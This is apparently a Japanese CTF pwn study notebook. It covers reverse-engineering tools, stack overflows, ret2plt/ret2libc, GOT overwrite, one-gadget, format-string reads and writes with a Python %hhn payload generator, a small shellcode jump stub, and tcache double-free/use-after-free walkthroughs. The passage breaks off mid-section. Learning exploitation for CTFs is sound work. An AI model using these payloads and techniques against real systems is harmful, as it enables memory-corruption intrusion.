<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [表層解析](#%E8%A1%A8%E5%B1%A4%E8%A7%A3%E6%9E%90)
- [動的解析](#%E5%8B%95%E7%9A%84%E8%A7%A3%E6%9E%90)
- [静的解析](#%E9%9D%99%E7%9A%84%E8%A7%A3%E6%9E%90)
  - [radare2](#radare2)
  - [gdb](#gdb)
    - [gdb-peda](#gdb-peda)
    - [gdb-pwndbg](#gdb-pwndbg)
    - [gdb-Pwndbg](#gdb-pwndbg)
    - [gdb-gef](#gdb-gef)
  - [Ghidra](#ghidra)
  - [Ollydbg](#ollydbg)
  - [Immunity Debugger](#immunity-debugger)
  - [angr](#angr)
- [exploit](#exploit)
  - [stack base BOF](#stack-base-bof)
  - [スタックアラインメント](#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%82%A2%E3%83%A9%E3%82%A4%E3%83%B3%E3%83%A1%E3%83%B3%E3%83%88)
  - [ret2plt](#ret2plt)
  - [ret2libc](#ret2libc)
  - [GOT Overwrite](#got-overwrite)
  - [gadget](#gadget)
    - [one-gadget RCE](#one-gadget-rce)
    - [スタック上に用意したペイロードにjmp](#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E4%B8%8A%E3%81%AB%E7%94%A8%E6%84%8F%E3%81%97%E3%81%9F%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%ABjmp)
  - [format string bug](#format-string-bug)
  - [libc leak](#libc-leak)
    - [stack上のbacktraceを利用](#stack%E4%B8%8A%E3%81%AEbacktrace%E3%82%92%E5%88%A9%E7%94%A8)
  - [Heap](#heap)
    - [double free](#double-free)
    - [Use After Free](#use-after-free)
    - [tcache](#tcache)
      - [malloc時の動作](#malloc%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [free時の動作](#free%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [tcache poisoning](#tcache-poisoning)
      - [tcacheの通常時の動作](#tcache%E3%81%AE%E9%80%9A%E5%B8%B8%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [tcacheの7つ埋めたあとにunsorted_binsに入る動作](#tcache%E3%81%AE7%E3%81%A4%E5%9F%8B%E3%82%81%E3%81%9F%E3%81%82%E3%81%A8%E3%81%ABunsorted_bins%E3%81%AB%E5%85%A5%E3%82%8B%E5%8B%95%E4%BD%9C)
      - [tcacheの7つ埋めたあとにfastbinsに入る動作](#tcache%E3%81%AE7%E3%81%A4%E5%9F%8B%E3%82%81%E3%81%9F%E3%81%82%E3%81%A8%E3%81%ABfastbins%E3%81%AB%E5%85%A5%E3%82%8B%E5%8B%95%E4%BD%9C)
    - [off-by-one error](#off-by-one-error)
      - [off-by-one-errorでchunk sizeを書き換えてヒープのleak](#off-by-one-error%E3%81%A7chunk-size%E3%82%92%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%A6%E3%83%92%E3%83%BC%E3%83%97%E3%81%AEleak)
      - [off-by-one-errorとHeap leak+tcacheを7つリンク](#off-by-one-error%E3%81%A8heap-leaktcache%E3%82%927%E3%81%A4%E3%83%AA%E3%83%B3%E3%82%AF)
    - [Heap overlap](#heap-overlap)
    - [Heap領域の上書きの利用](#heap%E9%A0%98%E5%9F%9F%E3%81%AE%E4%B8%8A%E6%9B%B8%E3%81%8D%E3%81%AE%E5%88%A9%E7%94%A8)
    - [Heap問のlibc leak](#heap%E5%95%8F%E3%81%AElibc-leak)
    - [Heapでの system("/bin/sh")実行の流れ](#heap%E3%81%A7%E3%81%AE-systembinsh%E5%AE%9F%E8%A1%8C%E3%81%AE%E6%B5%81%E3%82%8C)
    - [C++のvtableの書き換え](#c%E3%81%AEvtable%E3%81%AE%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88)
  - [SEH overflow](#seh-overflow)
    - [Payload実行までの流れ](#payload%E5%AE%9F%E8%A1%8C%E3%81%BE%E3%81%A7%E3%81%AE%E6%B5%81%E3%82%8C)
    - [SafeSEH](#safeseh)
    - [PoC](#poc)
- [よく見るかたまり](#%E3%82%88%E3%81%8F%E8%A6%8B%E3%82%8B%E3%81%8B%E3%81%9F%E3%81%BE%E3%82%8A)
    - [関数の先頭](#%E9%96%A2%E6%95%B0%E3%81%AE%E5%85%88%E9%A0%AD)
    - [関数の終わり](#%E9%96%A2%E6%95%B0%E3%81%AE%E7%B5%82%E3%82%8F%E3%82%8A)
    - [main関数の状態](#main%E9%96%A2%E6%95%B0%E3%81%AE%E7%8A%B6%E6%85%8B)
    - [strcmp](#strcmp)
    - [変数](#%E5%A4%89%E6%95%B0)
  - [覚えておきたい](#%E8%A6%9A%E3%81%88%E3%81%A6%E3%81%8A%E3%81%8D%E3%81%9F%E3%81%84)
    - [方針](#%E6%96%B9%E9%87%9D)
    - [起動時の動作](#%E8%B5%B7%E5%8B%95%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
    - [呼び出し規約](#%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E8%A6%8F%E7%B4%84)
    - [アドレス関係](#%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E9%96%A2%E4%BF%82)
    - [リトルエンディアン](#%E3%83%AA%E3%83%88%E3%83%AB%E3%82%A8%E3%83%B3%E3%83%87%E3%82%A3%E3%82%A2%E3%83%B3)
    - [pwntools](#pwntools)
      - [文字列操作](#%E6%96%87%E5%AD%97%E5%88%97%E6%93%8D%E4%BD%9C)
      - [通信関係](#%E9%80%9A%E4%BF%A1%E9%96%A2%E4%BF%82)
      - [ELF解析](#elf%E8%A7%A3%E6%9E%90)
      - [Rop Chain](#rop-chain)
    - [metasploit](#metasploit)
    - [nasm](#nasm)
      - [bypass NULLbyte](#bypass-nullbyte)
      - [Egg-Hunter](#egg-hunter)
    - [Windows周り](#windows%E5%91%A8%E3%82%8A)
    - [alarmのbypass](#alarm%E3%81%AEbypass)
    - [Cの関数](#c%E3%81%AE%E9%96%A2%E6%95%B0)
- [参考文献](#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE)
  - [Heap](#heap-1)
  - [SEH overflow](#seh-overflow-1)
  - [Egg-Hunting](#egg-hunting)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## 表層解析
- file
- strings
- checksec.sh --file ./file
  - Full RELRO   
  プログラム起動時に共有ライブラリのアドレスをキャッシュ後にGOT領域をReadOnlyにする。GOT Overwriteできない
  - Partial RELRO   
  GOT領域は書き込み可能。GOT(Global Offset Table)は、共有ライブラリの関数のアドレスが保存された領域
  - No RELRO   
  GOT Overwrite可能。
  - ASLR   
  実行ファイルのスタックやヒープ、ライブラリをメモリに配置するときに、アドレスの一部をランダムに配置する   
  ランダム化されるのは、ヒープ・スタック・mmap(共有ライブラリ)で、実行ファイルが配置されるアドレスはランダム化されない。   
- `readelf -r file`   
GOT領域のアドレスを表示   
- `objdump -d -M intel -j .plt file`   
pltのアドレスを表示   
- `one_gadget libc-2.27.so`   
libcに存在する、そこに飛ばすだけでシェルが起動できるOne-gadget RCEを探す。   
前提条件などがある。   
## 動的解析
- ./file (引数)   
引数を変えてみて、入力に対して出力が一対一かどうか確認
- strace ./file (引数)   
システムコールをトレースする
- ltrace ./file (引数)   
標準ライブラリ関数をトレースする   
- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
- `socat TCP-LISTEN:4000,reuseaddr,fork 'system:gdbserver localhost\:5000 ./file' 2> /dev/null &`   
gdbでアタッチできるようにgdbserverで立ち上げる。   
`gdb-peda -ex 'target remote localhost:5000' -ex 'b main' -ex 'c'`   
でアタッチ。   
- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   

## 静的解析
### radare2
- `radare2 ./binary`
- `afl`   
関数の一覧を表示
- `pdf @main`   
main関数を逆アセンブル   
- `pdd @ main`   
main関数をデコンパイル   
- `s main`   
main関数に移動   
- `VV`   
ヴィジュアルモードでわかりやすく表示してくれる。神。hjklで移動できる   

### gdb
- disas main   
main関数を逆アセンブル
- x/(表示する数)(メモリサイズ bhwg)(表示フォーマット six)(表示するメモリの先頭アドレス *0x08...)   
  - b:BYTE(1バイト)   
  - h:HALFWORD(2バイト)   
  - w:WORD(4バイト)   
  - g:GIANTWORD(8バイト)   
  - s:文字列   
  - i:命令   
  - x:16進数   
  - 例) `x /4wx $rbp-0x90`   
  rbp-0x90のアドレスのメモリ上の値を表示   
  - 例) `x /4wi main+11`,`x /4wi $rip`   
  指定したアドレスから4つ分の命令を表示
- アドレス確認   
   - bt   
   `__libc_start_main`のアドレスを確認 (正確には__libc_stat_main+231など)
   - p system   
   `__libc_system`のアドレスを確認   
   - p &main_arena   
   main_arenaのアドレスを確認   
   - vmmap   
   ```txt
   0x00602000         0x00623000         rw-p	[heap]
   0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
   ```
   libc_baseが`0x00007ffff79e4000`とわかる   
 - メモリの書き換え   
   - `set *0x12345678=0x1234`   
   - `set *(char *)0x1233456=0x12`   
   バイト単位で書き換えられる   
#### gdb-peda 
- `gdb-peda ./file`   
- `pdisas main`
色付きで逆アセンブルして見やすい。   
- `nextcall`   
次のcallまで処理を進めてくれる   
- `tel $rbp-8*4 5`   
わかりやすくメモリの状態を表示してくれる   
- `vmmap`   
メモリ内の大体を表示   
- `pattc 200`      
- `patto AAAJ`   
- `dumprop`   
ropに使える、直後にretの存在する命令を探す   
#### gdb-pwndbg
- `gdb-pendbg ./file`   
- `heap`   
- `bins`   
- `arena`   
https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md   
#### gdb-Pwndbg
- `gdb-Pwndbg ./file`   
- `heapinfo`   
https://github.com/scwuaptx/Pwngdb   
#### gdb-gef
- `gdb-gef ./file`   
https://github.com/hugsy/gef   

### Ghidra
- `./ghirdaRun`   
でGhidraを起動。
- `[File]` -> `[import file]`でbinaryをインポート   
- `[Symbol Tree]`(左真ん中) -> `[Functions]`で関数を確認。ダブルクリックでそこに移動。   
- `[Decompile]`(右下) でコンパイル結果を表示   

### Ollydbg
- `[Shift]+[F8]`   
- `[Alt]+E`   
実行可能モジュールのリストを表示   
### Immunity Debugger
- `[F7],[F8]`   
ステップイン、ステップオーバー実行   
- `[F2]`   
set brakepoint   
- `[Alt]+E`   
実行可能モジュールのリストを表示   
- `[Alt]+M`   
メモリの状態を表示   
一番上を選択した状態で`[Search]`すると上から検索できる。`[Ctrl]+L`で続きを検索。   
### angr
以下でInstall   
```txt
root@tomoki-VirtualBox:/opt# cd angr/
root@tomoki-VirtualBox:/opt/angr# virtualenv ENV
root@tomoki-VirtualBox:/opt/angr# . ENV/bin/activate
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install angr
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install -U protobuf
```
`(ENV) root@tomoki-VirtualBox:/opt/angr# python3 /home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/solver-angr.py 
`   
でangrスクリプトを実行して、解析してフラグを表示。   
以下、angrのテンプレート。

```python
import angr
from claripy import *

# バイナリのパスを指定
proj = angr.Project('/home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/mask')

# 8*40 でフラグの最大を40バイトに指定?(これがないと動かなかった)
sym_arg = BVS('sym_arg',8*40)

# mask というファイル名を指定
# state = proj.factory.entry_state()  でもyakisobaはいけた
argv=['mask',sym_arg]
state = proj.factory.entry_state(args=argv)
sm = proj.factory.simgr(state)

# find に Corrent  avoid に wrong という文字列の存在するアドレスを指定
# |      ||   0x000006d2      488d3d2e0a00.  lea rdi, str.Correct        ; 0x1107 ; "Correct!" ; const char *s
# radare2 の 0x6d2 + 0x400000 = 0x4006d2 などとしてアドレスを計算する
sm.explore(find=0x4012cf,avoid={0x4012dd,0x4011a9})

if sm.found:
    for i in sm.found:
        # yakisobaは以下で表示できた
        #print(i.posix.dumps(0))
        # これじゃないとフラグが出なかった
        print(i.solver.eval(sym_arg,cast_to=bytes).decode('utf-8','ignore'))

```
## exploit
### stack base BOF
- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   
### スタックアラインメント
x86-64の場合、関数を呼び出すときには、`RSP`は必ず16の倍数のアドレスにいなければならない。   
リターンアドレスを書き換えて別の関数を呼び出す際に考慮する必要がある。   
もしそうでない場合、`ret`を入れたり、`push rbp`を無視して16の倍数にそろえる。 
以下は`ret`命令のアドレス`0x4007f0`をFunc1_ret領域に上書きした場合の動作。   
```txt
  4007f0:	c3                   	retq   
overW_ret = 0x4007f0
func_addr = win関数のアドレス

  ret 直前       ->       ret 直後           ->          ret gadget後
RIP = ret命令のアドレス  RIP = 0x4007f0                 RIP = win関数のアドレス
(Low)
|         |             |         |                    |         |
|   ...   |             |   ...   |                    |   ...   |
|   100h  |             |   100h  |                    |   100h  |
|   ...   |             |   ...   |                    |   ...   |
|saved_ebp| __ esp      |saved_ebp|                    |saved_ebp|
|overW_ret| (書き換えた) |overW_ret| (書き換えた) __ esp |overW_ret| (書き換えた)
|func_addr| (書き換えた) |func_addr| (書き換えた)        |func_addr| (書き換えた) __ esp
|  arg2   |             |  arg2   |                    |  arg2   |
|   ...   | __ ebp      |   ...   | __ ebp             |   ...   | __ ebp
|         |             |         |                    |         |
(High)
```
### ret2plt
`printf@plt`とかをリターンアドレスをにセットすると、動的リンクされたライブラリのアドレスを解決してライブラリ内の関数(printf)を実行してくれる。   
libc_printfを知っている必要がない！   
system関数はpltにはない。printf@pltをよく使う？   
`objdump  -d -M intel -j .plt  chall`   
でpltの一覧を取得。   
pltのアドレスは実行ファイル内のアドレスなので有効(ASLR関係ない)。
```txt
# x86
    ret前
|           |
|   100h    |
| saved_ebp | __ esp
| ret_addr  | <- printf@plt
|   arg1    | <- 0x42424242 (printf呼び出し後の偽のリターンアドレス)
|   arg2    | <- buffer変数のアドレス
|   ....    |
|           | __ ebp
|           |

# x86-64
    ret前
|           |
|   100h    |
| saved_rbp | __ rsp
| ret_addr  | <- pop rdi;retへのアドレス
|   arg1    | <- rdiに入れたいGOT printfのアドレス (libc_printfが書き込まれている)
|   arg2    | <- puts@plt
|           | <- addr_main (puts関数のリターンアドレス)
|   ....    |
|           | __ rbp
|           |

```
### ret2libc
動的リンクされたライブラリのアドレスをリターンアドレスにセットして、呼び出す。   
ASLRによって動的リンクされたライブラリはランダム化されるため、libc leakが前提条件。   

### GOT Overwrite
動的リンクされた関数などのアドレステーブルのGOT領域に書いてある関数のアドレスを上書き。   
.pltはGOT領域のアドレステーブルを参照して関数のアドレスを取得する。   
No RELRO, Partial RELEROの場合に有効。   
`readelf -r file`   
で調べる。書かれている関数のアドレスは隣接している。   
```txt
再配置セクション '.rela.plt' at offset 0x4b0 contains 7 entries:
  オフセット      情報           型             シンボル値    シンボル名 + 加数
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000601038  000700000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
000000601040  000800000007 R_X86_64_JUMP_SLO 0000000000000000 atol@GLIBC_2.2.5 + 0
000000601048  000900000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```
例）exitのGOTを書き換えて、mainに飛ばす    
```txt
初回
call exit -> exit@plt+0 ->[exit GOT] -> exit@plt+6 -> .plt -> libc_exit

2回目以降
call exit -> exit@plt+0 ->[exit GOT] -> libc_exit
--------------------------------------------------------------
exit初回呼び出し前

[exit GOT]
000000601050: 4006d6  <- exit@plt+6をはじめは指している

00000000004006d0 <exit@plt>:
  4006d0:	ff 25 7a 09 20 00    	jmp    QWORD PTR [rip+0x20097a]        # 601050 <exit@GLIBC_2.2.5> <- exit GOTを指している
  4006d6:	68 07 00 00 00       	push   0x7
  4006db:	e9 70 ff ff ff       	jmp    400650 <.plt>   <- 初回はこの処理をして、exitGOTにlibcのアドレスを書きこむ

exitは一度もまだ呼ばれていないのでexitのGOTにはexit@pltのアドレス解決コードへのアドレスが書かれている。
--------------------------------------------------------------
2回目以降のexit呼び出し前

[exit GOT]
000000601050: 0x7ffff7a27120  <- libc_exitが書き込まれている！！

00000000004006d0 <exit@plt>:
  4006d0:	ff 25 7a 09 20 00    	jmp    QWORD PTR [rip+0x20097a]        # 601050 <exit@GLIBC_2.2.5>  <- exit GOTを指している
  4006d6:	68 07 00 00 00       	push   0x7
  4006db:	e9 70 ff ff ff       	jmp    400650 <.plt>   <- 2回目以降はこの処理は入らない

```
### gadget
x86-64の場合は、引数はrdi引数から始まるため、スタックにしか書き込めない場合は`pop rdi;ret`によってRDIレジスタに引数にしたい値を書き込むことになる。
#### one-gadget RCE
libcに存在する、そこに実行を移すだけで`/bin/sh`が起動するガジェット。   
それぞれ制約があるが、それほど気にせずに全部試してダメだったら対応すればいいらしい。   
```txt
takabaya-shi@takabayashi-VirtualBox:~/$ one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
takabaya-shi@takabayashi-VirtualBox:~/$
```
#### スタック上に用意したペイロードにjmp
SEH bofなどでは、スタックの最後の方の小さいスペースしか残らずペイロード実行ができないため、サイズの大きい領域に書き込んだペイロードを実行するために、`jmp-0x300`命令などでそのペイロードのあるスタックのアドレスにジャンプすることが多い。   
その際、スタックのアドレスはランダム化されており、わからないため、相対アドレスで参照することになる。   
```txt
# $baddata .= "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF";

\x59			POP ECX      <- [2] call命令によってpushされたアドレスをECXに代入。スタックのアドレスが入る
\xFE\xCD		DEC CH     <- [3] (ECX-256)と同じ
\xFE\xCD		DEC CH     <- [4] (ECX-256)と同じ
\xFE\xCD		DEC CH     <- [5] (ECX-256)と同じ
\xFF\xE1		JMP ECX    <- [6] popしたECX-758のアドレスにjmpして、ここに設置したペイロードを実行！
\xE8\xF2\xFF\xFF\xFF	CALL [relative -0D] <- [1] まずここにjmpしてcall $-0xdを呼び出す(前提条件)
                                             この命令の存在する次のアドレスをESPの指すアドレスにpushする
                                             この命令をスタック上で実行することを前提としているため、次のpopでスタックのアドレスが手に入る
```
### format string bug
以下のようにフォーマットが指定されていない場合に有効。   
```txt
printf(buf)
```
また、ret2pltなどでprintf関数を呼び出した際にも有効！！   
`%p`の場所は、x64の場合は5まではrsi,rdx,..のレジスタの内容で、6以降rspになるらしいので、`sub rsp YY`と`rbp-0xXX`を対応させて逆算するらしい。   
- `%p`   
スタック上のデータをvoid\*型として16進数で表示   
- `%n$p`   
スタック上の何番目のデータをvoid\*型として16進数で表示するかを指定することができる   
- `%x`   
スタック上にある値をそのまま出力する   
- `%d`   
スタック上にある値を整数として出力する   
`%4d`として出力幅を指定すると、4バイトになるように足りない分は空白で埋めて表示する。   
- `%s`   
スタック上にある値をポインタとして読み込んで表示   
- `%c`   
文字を出力する書式指定子。でもなんか0x41414141みたいなものを表示できた時もある(%pと入れ替わってるみたいな感じになってた…???)   
```txt
>>> conn.sendline("N"*8 + ",%c"*30) <- x86-64の場合は8バイト分入力すると8個目に0x4141414141414141がでた
>>> conn.recvline()
'AAAAAAAA,0x7fffffffdd10,(nil),0x7ffff7af4081,0x7ffff7dd18c0,0x7ffff7fe14c0,(nil),0x100,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0xa7025,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil)\n'

>>> conn.sendline("N"*8 + ",%8$c"+",%9$c"+",%10$c"+",%24$c")
>>> conn.recvline()
'AAAAAAAA,0x4141414141414141,0x39252c702438252c,0x70243031252c7024,(nil)\n'
```
- `%n`   
printfが呼ばれてから%nを見つけるまでに出力された文字数を引数のポインタに書き込む   
既知の任意のアドレスに書き込むことができる。   
入力した文字列に対応する引数が何番目かを特定して、任意のアドレス(最後の方に呼ばれる関数のGOT領域が多い)にone-gadget-rceなどを書き込む。   
その際に、libcのアドレスが必要なため、以下の手順を取るのが定石？   
- [1] スタック上にあるlibc_start_mainのアドレスをリーク (1回目のFSB)   
- [2] 最後に呼ばれる関数(exitなど)をmainに書き換えてループ　(1回目のFSB)   
- [3] 最後に呼ばれる関数(exitなど)をone-gadget-rceに書き換える (2回目のFSB)   
```txt
0x7fffffff_12345678に書き込みたい場合、
    \x78\x56\x34\x12\xff\xff\xff\x7f%9$n
とする。

    \x78\x56\x34\x12\xff\xff\xff\x7f%9$c
とすると、
0x7fffffff12345678が引数として設定されて、このアドレスに書き込むことができるようになる！

%43$nとかで、スタック上のリターンアドレスに書き込むことはできない。
スタック上のリターンアドレスを%43$cでleakできたとしても、このアドレスを引数にとることはできない？？   
-> できる！が、Partial RELROの場合はlibc_start_mainには書き込めない！！
(仮にできたとしても、スタック上じゃなくてlibc_start_mainのアドレスに書き込むことになるので良くなさそう)
-> スタック上に、スタック上のポインタがあれば、任意のアドレスに書き込める！
例）
0x7fffffffde90 | 0x7fffffffdff0
       ~
0x7fffffffdff0 | 0
となっている場合、2回のFSBで任意のアドレスに書き込める。

[1] 0x7fffffffdff0をprintfのポインタの引数として、このアドレスに0xdeadbeefを書き込む
[2] 0xdeadbeefをprintfのポインタの引数として、このアドレスに任意の値を書き込める！
```
- `%hn`   
２バイトだけ書き込む   
- `%hhn`   
1バイトだけ書き込む   
```python
# 参考 https://kusano-k.hatenadiary.com/entry/20140302/1393781714

from sys import *
from struct import *
T = [
    (0x080497fc, ord('h')),
    (0x080497fd, ord('a')),
    (0x080497fe, ord('c')),
    (0x080497ff, ord('k')),
]

# 書き込む文字列の先頭がprintfのoffset+1番目の引数
offset = 4

code = "".join(pack("I",t[0]) for t in T)  # "I"にすると4bytes, "l"にすると8bytes
#"I" '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08'
#"l" '\xfc\x97\x04\x00\x00\x00\x00\x00\xfd\x97\x84\x00\x00\x00\x00\x00\xfe\x97\x04\x08\x00\x00\x00\x00\xff\x97\x04\x08\x00\x00\x00\x00'

# 出力した文字数
n = len(code)

for i in range(len(T)):
    l = (T[i][1]-n-1)%256+1
    code += "%{0}c%{1}$hhn".format(l, offset+i)
    n += l

print >>stderr, "code:", repr(code)
print code
# '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08%88c%4$hhn%249c%5$hhn%2c%6$hhn%8c%7$hhn'
```
### libc leak
#### stack上のbacktraceを利用
stack上にはバックトレースという、エラー時にどの関数を呼んだのかをわかるようにするための情報が保存される。   
これをret2pltなどのprintfのFSBでleakする。   
```txt
gdb-peda$ bt
#0  0x0000000000400818 in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x40079e <main>, argc=0x1, 
    argv=0x7fffffffdf88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdf78) at ../csu/libc-start.c:310
#2  0x000000000040061a in _start ()
gdb-peda$ tel 0x00007ffff7a05b97 1
0000| 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)

libc_start_main = 0x7ffff7a05b97 -231
libc_base = libc_start_main - offset_libc_start
```

### Heap
#### double free
libc2.29より前のtcacheにはdouble freeのチェックがなく、任意のアドレスに任意の値を書き込むことができる！   
```txt
B=malloc(0x88); "a"を書き込む;
free(B);                      <- [1]
free(B);                      <- [2] fdにHeapアドレスが書き込まれる [double free]
show(B);                      <- [3] Heapアドレスのleak!!!         [Use After Free]
malloc(0x88);"A"*8を書き込む;  <- [4] 
malloc(0x88);"B"*8を書き込む;  <- [5] "AAAAAAAA"アドレスに値("BBBBBBBB")を書き込める！
----------------------------------------------------------------------------------------
[1]free(B); 後

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x0

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000000000000000	0x6161616161616161

------------------------------------- ---------------------------------------------------
[2]free(B); 後 (double free)

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x555555757650

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000555555757650	0x6161616161616161 <- このchunkのfdにchunk自体のアドレスが！

double freeでtcache[0x90]がこのような状態になる！
----------------------------------------------------------------------------------------
[3]show(B);  (Use After free)

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x555555757650

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000555555757650	0x6161616161616161 <- UAFより、このアドレスをshowできる！

Use After Freeはfreeしたchunkに参照できる脆弱性。
今回は、BをfreeしたのでBにはもう参照できなくするべき！
しかし、malloc(B)が返したアドレスが保持されているため再度アクセスでき、中身を見れてしまう！
----------------------------------------------------------------------------------------
[4]malloc(0x88);"A"*8を書き込む;後

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x4141414141414141

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x4141414141414141	0x6161616161616161 <- このchunkのfdに任意の値を書き込める！

次に0x90sizeをmallocするとmallocは0x4141414141414141を返す！
----------------------------------------------------------------------------------------
[5]malloc(0x88);"B"*8を書き込む;後

tcachebins
0x90 [  1]:  0x4141414141414141

0x4141414141414141:　0x4242424242424242	0x????????????????? <- 0x4141414141414141に任意の値を書き込めた！ 

```
libc2.28以降はkeyメンバが追加されているため、double freeしにくい状況になっている。   
```txt
[1] free後

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x0

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000000000000000	0x0000555555559010 <- keyメンバにはtcache自体のアドレスが入っている！

free() の際には key の値をチェックし、もしこれがtcacheのアドレスと同一であった場合には double free としてエラーを吐く
今の場合は、この後にさらにfreeすることはできない！
```
#### Use After Free
freeしたアドレスを保持しているため、free後にshow関数などでchunkの中身を見れる脆弱性。   
上の例参照。   
#### tcache
**tcache**は、malloc(0x18)などで比較的小さいサイズのチャンクを確保したときに、そのあとfreeすると、そのチャンクサイズに対応するtcache[0x18]の値でfdのアドレスの値を上書きし(tcache[0x18]に値がなければNULL(0x0000000)を書き込む)、tcache[0x18]にfdのアドレスを書き込む。   
小さいサイズのmallocしたチャンクをfreeするときに、まずfastbinsの前にtcacheに書き込まれる。fastbinsもtcacheと同じくキャッシュ(freeした場所のアドレスをリンク形式で格納している)。   
リンク形式なので、例えば以下のようになっている場合、   
```txt
tcache[0x20] = 0x00010000  
address        value   
0x00010000 -> |0x00020000| 
0x00020000 -> |0x00050000|
0x00050000 -> |0x00000000|
```
`tcache[0x20] -> 0x00010000 -> 0x00020000 -> 0x00050000 -> EOT(End of Tcache)`   
となる。   
tcache[]は最大7個まで使えて、それらを使い切ると次にfastbinsを使いだす。   
fastbinsはmain_arena(Heap領域を管理している場所)に存在するが、tcacheは別の場所に存在。

これを使ってfree時にtcache[0x20]にアドレスを書き込んでおけば、次にtcache[0x20]に対応したサイズ分mallocしたいときに、先ほどキャッシュしたtcache[0x20]に書かれているアドレスを再利用する。   

##### malloc時の動作
tcache[0x20]の値を、その値が指しているアドレスに書き換える。そして、アドレスを戻り値として返す。   
下の例では`address_1`を返す。これによって、`address_1`に書き込むことができる。   
tcache[0x20]に入っているということは、チャンクサイズが`0x20`ということを意味しているが、本当に`address_1-0x8`が`0x20`かどうかはmalloc時に確認しないし、`address_1-0x8`に`0x20`を上書きするようなこともしない。   
```txt
malloc(0x18)前
tcache[0x20] -> address_1 -> address_2 -> address_3 -> EOT

malloc(0x18)後
tcache[0x20] -> address_2 -> address_3 -> EOT  ([1] 0x18に対応するtcache[0x20]の値であるaddress_1を返す)
                                               ([2] 0x18に対応するtcache[0x20]の値を次のaddress_2に上書き)
```
##### free時の動作
free(B)が呼ばれたとき(Bはmallocしていたチャンクのアドレス)、`B-0x8`に書かれている`chunk size`の値を確認して、その値に対応する`tcache->entries[tc_idx]`(0x21が書かれていればtcache[0x20])の値を`Bのアドレス`に書き込んで、`Bのアドレス`を`tcache->entries[tc_idx]`に書き込む。   
```txt
free(B)前
tcache[0x20] -> EOT
address         value
0x00010000 -> |0x0000000000000021| (0x21がチャンクサイズ。これに対応するtcache[0x20]をfree時に操作する)
0x00010008 -> |0x4141414141414141| <- B (ここがmallocされていた場所。今から解放したい)

free(B)後
